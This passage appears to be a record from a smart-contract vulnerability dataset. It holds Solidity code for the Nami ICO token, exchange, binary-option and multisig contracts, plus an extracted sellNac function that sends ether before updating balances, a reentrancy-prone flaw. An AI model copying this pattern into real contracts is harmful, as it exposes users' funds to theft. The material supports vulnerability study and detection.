_roundIndex, uint _amount)\n public\n onlyEscrow\n {\n require(round[_roundIndex].isCloseEthPool == false && round[_roundIndex].isOpen == false);\n require(namiMultiSigWallet != 0x0);\n if (_amount > 0) {\n namiMultiSigWallet.transfer(_amount);\n round[_roundIndex].ethBalance = round[_roundIndex].ethBalance.sub(_amount);\n WithdrawPool(_amount, now);\n }\n }\n function closeEthPool(uint _roundIndex)\n public\n onlyEscrow\n {\n require(round[_roundIndex].isCloseEthPool == false && round[_roundIndex].isCompleteActive == true && round[_roundIndex].isOpen == false);\n round[_roundIndex].isCloseEthPool = true;\n }\n function _withdrawNAC(address _shareAddress, uint _roundIndex) internal {\n require(namiPool[_roundIndex][_shareAddress].stake > 0);\n NamiCrowdSale namiToken = NamiCrowdSale(NamiAddr);\n uint previousBalances = namiToken.balanceOf(this);\n namiToken.transfer(_shareAddress, namiPool[_roundIndex][_shareAddress].stake);\n round[_roundIndex].currentNAC = round[_roundIndex].currentNAC.sub(namiPool[_roundIndex][_shareAddress].stake);\n namiPool[_roundIndex][_shareAddress].stake = 0;\n assert(previousBalances > namiToken.balanceOf(this));\n }\n function withdrawTopForTeam(address _shareAddress, uint _roundIndex)\n onlyEscrow\n public\n {\n require(round[_roundIndex].isCompleteActive == true && round[_roundIndex].isCloseEthPool == true && round[_roundIndex].isOpen == false);\n require(round[_roundIndex].topWithdrawable);\n if(namiPool[_roundIndex][_shareAddress].isActive == true) {\n require(namiPool[_roundIndex][_shareAddress].isWithdrawn == false);\n assert(round[_roundIndex].finalNAC > namiPool[_roundIndex][_shareAddress].stake);\n uint ethReturn = (round[_roundIndex].ethBalance.mul(namiPool[_roundIndex][_shareAddress].stake)).div(round[_roundIndex].finalNAC);\n _shareAddress.transfer(ethReturn);\n namiPool[_roundIndex][_shareAddress].isWithdrawn = true;\n Withdraw(_shareAddress, _roundIndex, ethReturn, namiPool[_roundIndex][_shareAddress].stake, now);\n _withdrawNAC(_shareAddress, _roundIndex);\n }\n }\n function withdrawNonTopForTeam(address _shareAddress, uint _roundIndex)\n onlyEscrow\n public\n {\n require(round[_roundIndex].isCompleteActive == true && round[_roundIndex].isOpen == false);\n require(round[_roundIndex].withdrawable);\n if(namiPool[_roundIndex][_shareAddress].isActive == false) {\n require(namiPool[_roundIndex][_shareAddress].isWithdrawn == false);\n namiPool[_roundIndex][_shareAddress].isWithdrawn = true;\n Withdraw(_shareAddress, _roundIndex, 0, namiPool[_roundIndex][_shareAddress].stake, now);\n _withdrawNAC(_shareAddress, _roundIndex);\n }\n }\n function withdrawTop(uint _roundIndex)\n public\n {\n require(round[_roundIndex].isCompleteActive == true && round[_roundIndex].isCloseEthPool == true && round[_roundIndex].isOpen == false);\n require(round[_roundIndex].topWithdrawable);\n if(namiPool[_roundIndex][msg.sender].isActive == true) {\n require(namiPool[_roundIndex][msg.sender].isWithdrawn == false);\n uint ethReturn = (round[_roundIndex].ethBalance.mul(namiPool[_roundIndex][msg.sender].stake)).div(round[_roundIndex].finalNAC);\n msg.sender.transfer(ethReturn);\n namiPool[_roundIndex][msg.sender].isWithdrawn = true;\n Withdraw(msg.sender, _roundIndex, ethReturn, namiPool[_roundIndex][msg.sender].stake, now);\n _withdrawNAC(msg.sender, _roundIndex);\n }\n }\n function withdrawNonTop(uint _roundIndex)\n public\n {\n require(round[_roundIndex].isCompleteActive == true && round[_roundIndex].isOpen == false);\n require(round[_roundIndex].withdrawable);\n if(namiPool[_roundIndex][msg.sender].isActive == false) {\n require(namiPool[_roundIndex][msg.sender].isWithdrawn == false);\n namiPool[_roundIndex][msg.sender].isWithdrawn = true;\n Withdraw(msg.sender, _roundIndex, 0, namiPool[_roundIndex][msg.sender].stake, now);\n _withdrawNAC(msg.sender, _roundIndex);\n }\n }\n}\ncontract NamiCrowdSale {\n using SafeMath for uint256;\n function NamiCrowdSale(address _escrow, address _namiMultiSigWallet, address _namiPresale) public {\n require(_namiMultiSigWallet != 0x0);\n escrow = _escrow;\n namiMultiSigWallet = _namiMultiSigWallet;\n namiPresale = _namiPresale;\n }\n string public name = \"Nami ICO\";\n string public symbol = \"NAC\";\n uint public decimals = 18;\n bool public TRANSFERABLE = false;\n uint public constant TOKEN_SUPPLY_LIMIT = 1000000000 * (1 ether / 1 wei);\n uint public binary = 0;\n enum Phase {\n Created,\n Running,\n Paused,\n Migrating,\n Migrated\n }\n Phase public currentPhase = Phase.Created;\n uint public totalSupply = 0;\n address public escrow;\n address public namiMultiSigWallet;\n address public namiPresale;\n address public crowdsaleManager;\n address public binaryAddress;\n mapping (address => uint256) public balanceOf;\n mapping (address => mapping (address => uint256)) public allowance;\n modifier onlyCrowdsaleManager() {\n require(msg.sender == crowdsaleManager);\n _;\n }\n modifier onlyEscrow() {\n require(msg.sender == escrow);\n _;\n }\n modifier onlyTranferable() {\n require(TRANSFERABLE);\n _;\n }\n modifier onlyNamiMultisig() {\n require(msg.sender == namiMultiSigWallet);\n _;\n }\n event LogBuy(address indexed owner, uint value);\n event LogBurn(address indexed owner, uint value);\n event LogPhaseSwitch(Phase newPhase);\n event LogMigrate(address _from, address _to, uint256 amount);\n event Transfer(address indexed from, address indexed to, uint256 value);\n function _transfer(address _from, address _to, uint _value) internal {\n require(_to != 0x0);\n require(balanceOf[_from] >= _value);\n require(balanceOf[_to] + _value > balanceOf[_to]);\n uint previousBalances = balanceOf[_from] + balanceOf[_to];\n balanceOf[_from] -= _value;\n balanceOf[_to] += _value;\n Transfer(_from, _to, _value);\n assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\n }\n function transferForTeam(address _to, uint256 _value) public\n onlyEscrow\n {\n _transfer(msg.sender, _to, _value);\n }\n function transfer(address _to, uint256 _value) public\n onlyTranferable\n {\n _transfer(msg.sender, _to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value)\n public\n onlyTranferable\n returns (bool success)\n {\n require(_value <= allowance[_from][msg.sender]);\n allowance[_from][msg.sender] -= _value;\n _transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public\n onlyTranferable\n returns (bool success)\n {\n allowance[msg.sender][_spender] = _value;\n return true;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData)\n public\n onlyTranferable\n returns (bool success)\n {\n tokenRecipient spender = tokenRecipient(_spender);\n if (approve(_spender, _value)) {\n spender.receiveApproval(msg.sender, _value, this, _extraData);\n return true;\n }\n }\n function changeTransferable () public\n onlyEscrow\n {\n TRANSFERABLE = !TRANSFERABLE;\n }\n function changeEscrow(address _escrow) public\n onlyNamiMultisig\n {\n require(_escrow != 0x0);\n escrow = _escrow;\n }\n function changeBinary(uint _binary)\n public\n onlyEscrow\n {\n binary = _binary;\n }\n function changeBinaryAddress(address _binaryAddress)\n public\n onlyEscrow\n {\n require(_binaryAddress != 0x0);\n binaryAddress = _binaryAddress;\n }\n function getPrice() public view returns (uint price) {\n if (now < 1517443200) {\n return 3450;\n } else if (1517443200 < now && now <= 1518048000) {\n return 2400;\n } else if (1518048000 < now && now <= 1518652800) {\n return 2300;\n } else if (1518652800 < now && now <= 1519257600) {\n return 2200;\n } else if (1519257600 < now && now <= 1519862400) {\n return 2100;\n } else if (1519862400 < now && now <= 1520467200) {\n return 2000;\n } else if (1520467200 < now && now <= 1521072000) {\n return 1900;\n } else if (1521072000 < now && now <= 1521676800) {\n return 1800;\n } else if (1521676800 < now && now <= 1522281600) {\n return 1700;\n } else {\n return binary;\n }\n }\n function() payable public {\n buy(msg.sender);\n }\n function buy(address _buyer) payable public {\n require(currentPhase == Phase.Running);\n require(now <= 1522281600 || msg.sender == binaryAddress);\n require(msg.value != 0);\n uint newTokens = msg.value * getPrice();\n require (totalSupply + newTokens < TOKEN_SUPPLY_LIMIT);\n balanceOf[_buyer] = balanceOf[_buyer].add(newTokens);\n totalSupply = totalSupply.add(newTokens);\n LogBuy(_buyer,newTokens);\n Transfer(this,_buyer,newTokens);\n }\n function burnTokens(address _owner) public\n onlyCrowdsaleManager\n {\n require(currentPhase == Phase.Migrating);\n uint tokens = balanceOf[_owner];\n require(tokens != 0);\n balanceOf[_owner] = 0;\n totalSupply -= tokens;\n LogBurn(_owner, tokens);\n Transfer(_owner, crowdsaleManager, tokens);\n if (totalSupply == 0) {\n currentPhase = Phase.Migrated;\n LogPhaseSwitch(Phase.Migrated);\n }\n }\n function setPresalePhase(Phase _nextPhase) public\n onlyEscrow\n {\n bool canSwitchPhase\n = (currentPhase == Phase.Created && _nextPhase == Phase.Running)\n || (currentPhase == Phase.Running && _nextPhase == Phase.Paused)\n || ((currentPhase == Phase.Running || currentPhase == Phase.Paused)\n && _nextPhase == Phase.Migrating\n && crowdsaleManager != 0x0)\n || (currentPhase == Phase.Paused && _nextPhase == Phase.Running)\n || (currentPhase == Phase.Migrating && _nextPhase == Phase.Migrated\n && totalSupply == 0);\n require(canSwitchPhase);\n currentPhase = _nextPhase;\n LogPhaseSwitch(_nextPhase);\n }\n function withdrawEther(uint _amount) public\n onlyEscrow\n {\n require(namiMultiSigWallet != 0x0);\n if (this.balance > 0) {\n namiMultiSigWallet.transfer(_amount);\n }\n }\n function safeWithdraw(address _withdraw, uint _amount) public\n onlyEscrow\n {\n NamiMultiSigWallet namiWallet = NamiMultiSigWallet(namiMultiSigWallet);\n if (namiWallet.isOwner(_withdraw)) {\n _withdraw.transfer(_amount);\n }\n }\n function setCrowdsaleManager(address _mgr) public\n onlyEscrow\n {\n require(currentPhase != Phase.Migrating);\n crowdsaleManager = _mgr;\n }\n function _migrateToken(address _from, address _to)\n internal\n {\n PresaleToken presale = PresaleToken(namiPresale);\n uint256 newToken = presale.balanceOf(_from);\n require(newToken > 0);\n presale.burnTokens(_from);\n balanceOf[_to] = balanceOf[_to].add(newToken);\n totalSupply = totalSupply.add(newToken);\n LogMigrate(_from, _to, newToken);\n Transfer(this,_to,newToken);\n }\n function migrateToken(address _from, address _to) public\n onlyEscrow\n {\n _migrateToken(_from, _to);\n }\n function migrateForInvestor() public {\n _migrateToken(msg.sender, msg.sender);\n }\n event TransferToBuyer(address indexed _from, address indexed _to, uint _value, address indexed _seller);\n event TransferToExchange(address indexed _from, address indexed _to, uint _value, uint _price);\n function transferToExchange(address _to, uint _value, uint _price) public {\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);\n balanceOf[_to] = balanceOf[_to].add(_value);\n Transfer(msg.sender,_to,_value);\n if (codeLength > 0) {\n ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);\n receiver.tokenFallbackExchange(msg.sender, _value, _price);\n TransferToExchange(msg.sender, _to, _value, _price);\n }\n }\n function transferToBuyer(address _to, uint _value, address _buyer) public {\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);\n balanceOf[_to] = balanceOf[_to].add(_value);\n Transfer(msg.sender,_to,_value);\n if (codeLength > 0) {\n ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);\n receiver.tokenFallbackBuyer(msg.sender, _value, _buyer);\n TransferToBuyer(msg.sender, _to, _value, _buyer);\n }\n }\n}\ncontract BinaryOption {\n address public namiCrowdSaleAddr;\n address public escrow;\n address public namiMultiSigWallet;\n Session public session;\n uint public timeInvestInMinute = 15;\n uint public timeOneSession = 20;\n uint public sessionId = 1;\n uint public rateWin = 100;\n uint public rateLoss = 20;\n uint public rateFee = 5;\n uint public constant MAX_INVESTOR = 20;\n uint public minimunEth = 10000000000000000;\n event SessionOpen(uint timeOpen, uint indexed sessionId);\n event InvestClose(uint timeInvestClose, uint priceOpen, uint indexed sessionId);\n event Invest(address indexed investor, bool choose, uint amount, uint timeInvest, uint indexed sessionId);\n event SessionClose(uint timeClose, uint indexed sessionId, uint priceClose, uint nacPrice, uint rateWin, uint rateLoss, uint rateFee);\n event Deposit(address indexed sender, uint value);\n function() public payable {\n if (msg.value > 0)\n Deposit(msg.sender, msg.value);\n }\n struct Session {\n uint priceOpen;\n uint priceClose;\n uint timeOpen;\n bool isReset;\n bool isOpen;\n bool investOpen;\n uint investorCount;\n mapping(uint => address) investor;\n mapping(uint => bool) win;\n mapping(uint => uint) amountInvest;\n }\n function BinaryOption(address _namiCrowdSale, address _escrow, address _namiMultiSigWallet) public {\n require(_namiCrowdSale != 0x0 && _escrow != 0x0);\n namiCrowdSaleAddr = _namiCrowdSale;\n escrow = _escrow;\n namiMultiSigWallet = _namiMultiSigWallet;\n }\n modifier onlyEscrow() {\n require(msg.sender==escrow);\n _;\n }\n modifier onlyNamiMultisig() {\n require(msg.sender == namiMultiSigWallet);\n _;\n }\n function changeEscrow(address _escrow) public\n onlyNamiMultisig\n {\n require(_escrow != 0x0);\n escrow = _escrow;\n }\n function changeMinEth(uint _minimunEth) public\n onlyEscrow\n {\n require(_minimunEth != 0);\n minimunEth = _minimunEth;\n }\n function changeTimeInvest(uint _timeInvest)\n public\n onlyEscrow\n {\n require(!session.isOpen && _timeInvest < timeOneSession);\n timeInvestInMinute = _timeInvest;\n }\n function changeTimeOneSession(uint _timeOneSession)\n public\n onlyEscrow\n {\n require(!session.isOpen && _timeOneSession > timeInvestInMinute);\n timeOneSession = _timeOneSession;\n }\n function changeRateWin(uint _rateWin)\n public\n onlyEscrow\n {\n require(!session.isOpen);\n rateWin = _rateWin;\n }\n function changeRateLoss(uint _rateLoss)\n public\n onlyEscrow\n {\n require(!session.isOpen);\n rateLoss = _rateLoss;\n }\n function changeRateFee(uint _rateFee)\n public\n onlyEscrow\n {\n require(!session.isOpen);\n rateFee = _rateFee;\n }\n function withdrawEther(uint _amount) public\n onlyEscrow\n {\n require(namiMultiSigWallet != 0x0);\n if (this.balance > 0) {\n namiMultiSigWallet.transfer(_amount);\n }\n }\n function safeWithdraw(address _withdraw, uint _amount) public\n onlyEscrow\n {\n NamiMultiSigWallet namiWallet = NamiMultiSigWallet(namiMultiSigWallet);\n if (namiWallet.isOwner(_withdraw)) {\n _withdraw.transfer(_amount);\n }\n }\n function getInvestors()\n public\n view\n returns (address[20])\n {\n address[20] memory listInvestor;\n for (uint i = 0; i < MAX_INVESTOR; i++) {\n listInvestor[i] = session.investor[i];\n }\n return listInvestor;\n }\n function getChooses()\n public\n view\n returns (bool[20])\n {\n bool[20] memory listChooses;\n for (uint i = 0; i < MAX_INVESTOR; i++) {\n listChooses[i] = session.win[i];\n }\n return listChooses;\n }\n function getAmount()\n public\n view\n returns (uint[20])\n {\n uint[20] memory listAmount;\n for (uint i = 0; i < MAX_INVESTOR; i++) {\n listAmount[i] = session.amountInvest[i];\n }\n return listAmount;\n }\n function resetSession()\n public\n onlyEscrow\n {\n require(!session.isReset && !session.isOpen);\n session.priceOpen = 0;\n session.priceClose = 0;\n session.isReset = true;\n session.isOpen = false;\n session.investOpen = false;\n session.investorCount = 0;\n for (uint i = 0; i < MAX_INVESTOR; i++) {\n session.investor[i] = 0x0;\n session.win[i] = false;\n session.amountInvest[i] = 0;\n }\n }\n function openSession ()\n public\n onlyEscrow\n {\n require(session.isReset && !session.isOpen);\n session.isReset = false;\n session.investOpen = true;\n session.timeOpen = now;\n session.isOpen = true;\n SessionOpen(now, sessionId);\n }\n function invest (bool _choose)\n public\n payable\n {\n require(msg.value >= minimunEth && session.investOpen);\n require(now < (session.timeOpen + timeInvestInMinute * 1 minutes));\n require(session.investorCount < MAX_INVESTOR);\n session.investor[session.investorCount] = msg.sender;\n session.win[session.investorCount] = _choose;\n session.amountInvest[session.investorCount] = msg.value;\n session.investorCount += 1;\n Invest(msg.sender, _choose, msg.value, now, sessionId);\n }\n function closeInvest (uint _priceOpen)\n public\n onlyEscrow\n {\n require(_priceOpen != 0 && session.investOpen);\n require(now > (session.timeOpen + timeInvestInMinute * 1 minutes));\n session.investOpen = false;\n session.priceOpen = _priceOpen;\n InvestClose(now, _priceOpen, sessionId);\n }\n function getEtherToBuy (uint _ether, bool _status)\n public\n view\n returns (uint)\n {\n if (_status) {\n return _ether * rateWin / 100;\n } else {\n return _ether * rateLoss / 100;\n }\n }\n function closeSession (uint _priceClose)\n public\n onlyEscrow\n {\n require(_priceClose != 0 && now > (session.timeOpen + timeOneSession * 1 minutes));\n require(!session.investOpen && session.isOpen);\n session.priceClose = _priceClose;\n bool result = (_priceClose>session.priceOpen)?true:false;\n uint etherToBuy;\n NamiCrowdSale namiContract = NamiCrowdSale(namiCrowdSaleAddr);\n uint price = namiContract.getPrice();\n require(price != 0);\n for (uint i = 0; i < session.investorCount; i++) {\n if (session.win[i]==result) {\n etherToBuy = (session.amountInvest[i] - session.amountInvest[i] * rateFee / 100) * rateWin / 100;\n uint etherReturn = session.amountInvest[i] - session.amountInvest[i] * rateFee / 100;\n (session.investor[i]).transfer(etherReturn);\n } else {\n etherToBuy = (session.amountInvest[i] - session.amountInvest[i] * rateFee / 100) * rateLoss / 100;\n }\n namiContract.buy.value(etherToBuy)(session.investor[i]);\n session.investor[i] = 0x0;\n session.win[i] = false;\n session.amountInvest[i] = 0;\n }\n session.isOpen = false;\n SessionClose(now, sessionId, _priceClose, price, rateWin, rateLoss, rateFee);\n sessionId += 1;\n session.priceOpen = 0;\n session.priceClose = 0;\n session.isReset = true;\n session.investOpen = false;\n session.investorCount = 0;\n }\n}\ncontract PresaleToken {\n mapping (address => uint256) public balanceOf;\n function burnTokens(address _owner) public;\n}\ncontract ERC223ReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool success);\n function tokenFallbackBuyer(address _from, uint _value, address _buyer) public returns (bool success);\n function tokenFallbackExchange(address _from, uint _value, uint _price) public returns (bool success);\n}\ncontract NamiExchange {\n using SafeMath for uint;\n function NamiExchange(address _namiAddress) public {\n NamiAddr = _namiAddress;\n }\n event UpdateBid(address owner, uint price, uint balance);\n event UpdateAsk(address owner, uint price, uint volume);\n event BuyHistory(address indexed buyer, address indexed seller, uint price, uint volume, uint time);\n event SellHistory(address indexed seller, address indexed buyer, uint price, uint volume, uint time);\n mapping(address => OrderBid) public bid;\n mapping(address => OrderAsk) public ask;\n string public name = \"NacExchange\";\n address public NamiAddr;\n uint public price = 1;\n struct OrderBid {\n uint price;\n uint eth;\n }\n struct OrderAsk {\n uint price;\n uint volume;\n }\n function() payable public {\n require(msg.data.length != 0);\n require(msg.value == 0);\n }\n modifier onlyNami {\n require(msg.sender == NamiAddr);\n _;\n }\n function placeBuyOrder(uint _price) payable public {\n require(_price > 0 && msg.value > 0 && bid[msg.sender].eth == 0);\n if (msg.value > 0) {\n bid[msg.sender].eth = (bid[msg.sender].eth).add(msg.value);\n bid[msg.sender].price = _price;\n UpdateBid(msg.sender, _price, bid[msg.sender].eth);\n }\n }\n function sellNac(uint _value, address _buyer, uint _price) public returns (bool success) {\n require(_price == bid[_buyer].price && _buyer != msg.sender);\n NamiCrowdSale namiToken = NamiCrowdSale(NamiAddr);\n uint ethOfBuyer = bid[_buyer].eth;\n uint maxToken = ethOfBuyer.mul(bid[_buyer].price);\n require(namiToken.allowance(msg.sender, this) >= _value && _value > 0 && ethOfBuyer != 0 && _buyer != 0x0);\n if (_value > maxToken) {\n if (msg.sender.send(ethOfBuyer) && namiToken.transferFrom(msg.sender,_buyer,maxToken)) {\n bid[_buyer].eth = 0;\n UpdateBid(_buyer, bid[_buyer].price, bid[_buyer].eth);\n BuyHistory(_buyer, msg.sender, bid[_buyer].price, maxToken, now);\n return true;\n } else {\n revert();\n }\n } else {\n uint eth = _value.div(bid[_buyer].price);\n if (msg.sender.send(eth) && namiToken.transferFrom(msg.sender,_buyer,_value)) {\n bid[_buyer].eth = (bid[_buyer].eth).sub(eth);\n UpdateBid(_buyer, bid[_buyer].price, bid[_buyer].eth);\n BuyHistory(_buyer, msg.sender, bid[_buyer].price, _value, now);\n return true;\n } else {\n revert();\n }\n }\n }\n function closeBidOrder() public {\n require(bid[msg.sender].eth > 0 && bid[msg.sender].price > 0);\n msg.sender.transfer(bid[msg.sender].eth);\n bid[msg.sender].eth = 0;\n UpdateBid(msg.sender, bid[msg.sender].price, bid[msg.sender].eth);\n }\n function tokenFallbackExchange(address _from, uint _value, uint _price) onlyNami public returns (bool success) {\n require(_price > 0 && _value > 0 && ask[_from].volume == 0);\n if (_value > 0) {\n ask[_from].volume = (ask[_from].volume).add(_value);\n ask[_from].price = _price;\n UpdateAsk(_from, _price, ask[_from].volume);\n }\n return true;\n }\n function closeAskOrder() public {\n require(ask[msg.sender].volume > 0 && ask[msg.sender].price > 0);\n NamiCrowdSale namiToken = NamiCrowdSale(NamiAddr);\n uint previousBalances = namiToken.balanceOf(msg.sender);\n namiToken.transfer(msg.sender, ask[msg.sender].volume);\n ask[msg.sender].volume = 0;\n UpdateAsk(msg.sender, ask[msg.sender].price, 0);\n assert(previousBalances < namiToken.balanceOf(msg.sender));\n }\n function buyNac(address _seller, uint _price) payable public returns (bool success) {\n require(msg.value > 0 && ask[_seller].volume > 0 && ask[_seller].price > 0);\n require(_price == ask[_seller].price && _seller != msg.sender);\n NamiCrowdSale namiToken = NamiCrowdSale(NamiAddr);\n uint maxEth = (ask[_seller].volume).div(ask[_seller].price);\n uint previousBalances = namiToken.balanceOf(msg.sender);\n if (msg.value > maxEth) {\n if (_seller.send(maxEth) && msg.sender.send(msg.value.sub(maxEth))) {\n namiToken.transfer(msg.sender, ask[_seller].volume);\n SellHistory(_seller, msg.sender, ask[_seller].price, ask[_seller].volume, now);\n ask[_seller].volume = 0;\n UpdateAsk(_seller, ask[_seller].price, 0);\n assert(previousBalances < namiToken.balanceOf(msg.sender));\n return true;\n } else {\n revert();\n }\n } else {\n uint nac = (msg.value).mul(ask[_seller].price);\n if (_seller.send(msg.value)) {\n namiToken.transfer(msg.sender, nac);\n ask[_seller].volume = (ask[_seller].volume).sub(nac);\n UpdateAsk(_seller, ask[_seller].price, ask[_seller].volume);\n SellHistory(_seller, msg.sender, ask[_seller].price, nac, now);\n assert(previousBalances < namiToken.balanceOf(msg.sender));\n return true;\n } else {\n revert();\n }\n }\n }\n}\ncontract ERC23 {\n function balanceOf(address who) public constant returns (uint);\n function transfer(address to, uint value) public returns (bool success);\n}\ncontract NamiMultiSigWallet {\n uint constant public MAX_OWNER_COUNT = 50;\n event Confirmation(address indexed sender, uint indexed transactionId);\n event Revocation(address indexed sender, uint indexed transactionId);\n event Submission(uint indexed transactionId);\n event Execution(uint indexed transactionId);\n event ExecutionFailure(uint indexed transactionId);\n event Deposit(address indexed sender, uint value);\n event OwnerAddition(address indexed owner);\n event OwnerRemoval(address indexed owner);\n event RequirementChange(uint required);\n mapping (uint => Transaction) public transactions;\n mapping (uint => mapping (address => bool)) public confirmations;\n mapping (address => bool) public isOwner;\n address[] public owners;\n uint public required;\n uint public transactionCount;\n struct Transaction {\n address destination;\n uint value;\n bytes data;\n bool executed;\n }\n modifier onlyWallet() {\n require(msg.sender == address(this));\n _;\n }\n modifier ownerDoesNotExist(address owner) {\n require(!isOwner[owner]);\n _;\n }\n modifier ownerExists(address owner) {\n require(isOwner[owner]);\n _;\n }\n modifier transactionExists(uint transactionId) {\n require(transactions[transactionId].destination != 0);\n _;\n }\n modifier confirmed(uint transactionId, address owner) {\n require(confirmations[transactionId][owner]);\n _;\n }\n modifier notConfirmed(uint transactionId, address owner) {\n require(!confirmations[transactionId][owner]);\n _;\n }\n modifier notExecuted(uint transactionId) {\n require(!transactions[transactionId].executed);\n _;\n }\n modifier notNull(address _address) {\n require(_address != 0);\n _;\n }\n modifier validRequirement(uint ownerCount, uint _required) {\n require(!(ownerCount > MAX_OWNER_COUNT\n || _required > ownerCount\n || _required == 0\n || ownerCount == 0));\n _;\n }\n function() public payable {\n if (msg.value > 0)\n Deposit(msg.sender, msg.value);\n }\n function NamiMultiSigWallet(address[] _owners, uint _required)\n public\n validRequirement(_owners.length, _required)\n {\n for (uint i = 0; i < _owners.length; i++) {\n require(!(isOwner[_owners[i]] || _owners[i] == 0));\n isOwner[_owners[i]] = true;\n }\n owners = _owners;\n required = _required;\n }\n function addOwner(address owner)\n public\n onlyWallet\n ownerDoesNotExist(owner)\n notNull(owner)\n validRequirement(owners.length + 1, required)\n {\n isOwner[owner] = true;\n owners.push(owner);\n OwnerAddition(owner);\n }\n function removeOwner(address owner)\n public\n onlyWallet\n ownerExists(owner)\n {\n isOwner[owner] = false;\n for (uint i=0; i<owners.length - 1; i++) {\n if (owners[i] == owner) {\n owners[i] = owners[owners.length - 1];\n break;\n }\n }\n owners.length -= 1;\n if (required > owners.length)\n changeRequirement(owners.length);\n OwnerRemoval(owner);\n }\n function replaceOwner(address owner, address newOwner)\n public\n onlyWallet\n ownerExists(owner)\n ownerDoesNotExist(newOwner)\n {\n for (uint i=0; i<owners.length; i++) {\n if (owners[i] == owner) {\n owners[i] = newOwner;\n break;\n }\n }\n isOwner[owner] = false;\n isOwner[newOwner] = true;\n OwnerRemoval(owner);\n OwnerAddition(newOwner);\n }\n function changeRequirement(uint _required)\n public\n onlyWallet\n validRequirement(owners.length, _required)\n {\n required = _required;\n RequirementChange(_required);\n }\n function submitTransaction(address destination, uint value, bytes data)\n public\n returns (uint transactionId)\n {\n transactionId = addTransaction(destination, value, data);\n confirmTransaction(transactionId);\n }\n function confirmTransaction(uint transactionId)\n public\n ownerExists(msg.sender)\n transactionExists(transactionId)\n notConfirmed(transactionId, msg.sender)\n {\n confirmations[transactionId][msg.sender] = true;\n Confirmation(msg.sender, transactionId);\n executeTransaction(transactionId);\n }\n function revokeConfirmation(uint transactionId)\n public\n ownerExists(msg.sender)\n confirmed(transactionId, msg.sender)\n notExecuted(transactionId)\n {\n confirmations[transactionId][msg.sender] = false;\n Revocation(msg.sender, transactionId);\n }\n function executeTransaction(uint transactionId)\n public\n notExecuted(transactionId)\n {\n if (isConfirmed(transactionId)) {\n transactions[transactionId].executed = true;\n if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {\n Execution(transactionId);\n } else {\n ExecutionFailure(transactionId);\n transactions[transactionId].executed = false;\n }\n }\n }\n function isConfirmed(uint transactionId)\n public\n constant\n returns (bool)\n {\n uint count = 0;\n for (uint i = 0; i < owners.length; i++) {\n if (confirmations[transactionId][owners[i]])\n count += 1;\n if (count == required)\n return true;\n }\n }\n function addTransaction(address destination, uint value, bytes data)\n internal\n notNull(destination)\n returns (uint transactionId)\n {\n transactionId = transactionCount;\n transactions[transactionId] = Transaction({\n destination: destination,\n value: value,\n data: data,\n executed: false\n });\n transactionCount += 1;\n Submission(transactionId);\n }\n function getConfirmationCount(uint transactionId)\n public\n constant\n returns (uint count)\n {\n for (uint i = 0; i < owners.length; i++) {\n if (confirmations[transactionId][owners[i]])\n count += 1;\n }\n }\n function getTransactionCount(bool pending, bool executed)\n public\n constant\n returns (uint count)\n {\n for (uint i = 0; i < transactionCount; i++) {\n if (pending && !transactions[i].executed || executed && transactions[i].executed)\n count += 1;\n }\n }\n function getOwners()\n public\n constant\n returns (address[])\n {\n return owners;\n }\n function getConfirmations(uint transactionId)\n public\n constant\n returns (address[] _confirmations)\n {\n address[] memory confirmationsTemp = new address[](owners.length);\n uint count = 0;\n uint i;\n for (i = 0; i < owners.length; i++) {\n if (confirmations[transactionId][owners[i]]) {\n confirmationsTemp[count] = owners[i];\n count += 1;\n }\n }\n _confirmations = new address[](count);\n for (i = 0; i < count; i++) {\n _confirmations[i] = confirmationsTemp[i];\n }\n }\n function getTransactionIds(uint from, uint to, bool pending, bool executed)\n public\n constant\n returns (uint[] _transactionIds)\n {\n uint[] memory transactionIdsTemp = new uint[](transactionCount);\n uint count = 0;\n uint i;\n for (i = 0; i < transactionCount; i++) {\n if (pending && !transactions[i].executed || executed && transactions[i].executed) {\n transactionIdsTemp[count] = i;\n count += 1;\n }\n }\n _transactionIds = new uint[](to - from);\n for (i = from; i < to; i++) {\n _transactionIds[i - from] = transactionIdsTemp[i];\n }\n }\n}",
  "extract_feature": [
    "function sellNac(uint _value, address _buyer, uint _price) public returns (bool success) {\nrequire(_price == bid[_buyer].price && _buyer != msg.sender);\nNamiCrowdSale namiToken = NamiCrowdSale(NamiAddr);\nuint ethOfBuyer = bid[_buyer].eth;\nuint maxToken = ethOfBuyer.mul(bid[_buyer].price);\nrequire(namiToken.allowance(msg.sender, this) >= _value && _value > 0 && ethOfBuyer != 0 && _buyer != 0x0);\nif (_value > maxToken) {\nif (msg.sender.send(ethOfBuyer) && namiToken.transferFrom(msg.sender,_buyer,maxToken)) {\nbid[_buyer].eth = 0;\nUpdateBid(_buyer, bid[_buyer].price, bid[_buyer].eth);\nBuyHistory(_buyer, msg.sender, bid[_buyer].price, maxToken, now);\nreturn true;\n} else {\nrevert();\n}\n} else {\nuint eth = _value.div(bid[_buyer].price);\nif (msg.sender.send(eth) && namiToken.transferFrom(msg.sender,_buyer,_value)) {\nbid[_buyer].eth = (bid[_buyer].eth).sub(eth);\nUpdateBid(_buyer, bid[_buyer].price, bid[_buyer].eth);\nBuyHistory(_buyer, msg.sender, bid[_buyer].price, _value, now);\nreturn true;\n} else {\nrevert();\n}\n}\n}",
